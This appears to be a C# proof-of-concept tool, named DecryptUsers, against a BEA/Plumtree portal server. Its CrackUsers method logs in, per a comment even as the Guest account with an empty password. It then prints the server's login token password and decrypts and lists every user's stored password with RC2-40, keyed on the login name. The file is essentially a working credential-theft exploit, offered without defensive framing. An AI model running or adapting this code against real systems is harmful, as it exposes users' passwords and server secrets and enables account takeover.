using System;
using com.plumtree.openfoundation.security;
using com.plumtree.openfoundation.util;
using com.plumtree.openkernel.config;
using com.plumtree.openkernel.factory;
using com.plumtree.portalpages.admin.editors.webservice;
using com.plumtree.portaluiinfrastructure.classtypedescriptors.providerframework;
using com.plumtree.server;
using com.plumtree.server.impl.core;
using com.plumtree.xpshared.config;

namespace Bea.BidServices {
	/// <summary>
	/// Main entry point class for the application.
	/// </summary>
	public class DecryptUsers {
		/// <summary>
		/// The main entry point for the application.
		/// </summary>
		[STAThread]
		public static void MainOld(string[] args) {
			CrackUsers();
		}
		
		public static void CrackUsers() {
			// change login info below...
			// as far as I can tell, this works with even the guest account in my portal
			IPTSession session = CreateSession("Guest", "");

			Console.WriteLine("Logged in as : " + session.GetUser().GetName());

			// get login token key
			IPTServerConfigSettings settings = (IPTServerConfigSettings) session.OpenGlobalObject(PT_GLOBALOBJECTS.PT_GLOBAL_SERVERCONFIGSETTINGS, false);
			Console.WriteLine(settings.GetSettingAsString(PT_SERVER_CONFIG_SETTINGNAME.PT_TOKEN_PASSWORD));

			IPTObjectManager userManager = session.GetUsers();
			IPTQueryResult result = userManager.Query(PT_PROPIDS.PT_PROPID_OBJECTID, -1, new int[] {PT_PROPIDS.PT_PROPID_OBJECTID}, 0, -1, null);

			Console.WriteLine("This will print the user name and password of every user.\n");
			Console.WriteLine("-------------------");
			Console.WriteLine("ID\tLogin\tPassword\n\n");

			for (int i = 0; i < result.RowCount(); i++) {
				IPTUser user = (IPTUser) userManager.Open(result.ItemAsInt(i, PT_PROPIDS.PT_PROPID_OBJECTID), false);
				string cryptPassword = user.GetEncryptedPassword();
				string login = user.GetLoginName();
				
				// get the encryped password
				IXPCrypto crypto = XPCrypto.GetInstance(XPCryptoType.RC2_40);

				// let's try to decrypt
				if ((cryptPassword.Length > 0) && (login.Length > 0)) {
					Console.Write(user.GetObjectID() + "\t");
					Console.Write(login + "\t");
					string password = crypto.Decrypt(cryptPassword, login);
					if (password.Length <= 0) {
						Console.Write("<blank>\n");
					} else {
						Console.Write(password + "\n");
					}
				}
			}

			Console.WriteLine("Press <Enter> to terminate...");
			Console.ReadLine();
		}

		/// <summary>
		/// Create a session (IPTSession) given a username and password.
		/// </summary>
		/// <param name="user">the user name</param>
		/// <param name="password">the password</param>
		/// <returns>the session</returns>
		public static IPTSession CreateSession(String user, String password) {
			// Create a session with the portal native API.
			IOKContext context = OKConfigFactory.createInstance(ConfigPathResolver.GetOpenConfigPath(), "portal");
			PortalObjectsFactory.Init(context);
			IPTSession ptSession = PortalObjectsFactory.CreateSession();
			ptSession.Connect(user, password, null);
				
			return ptSession;
		}
		
	}
}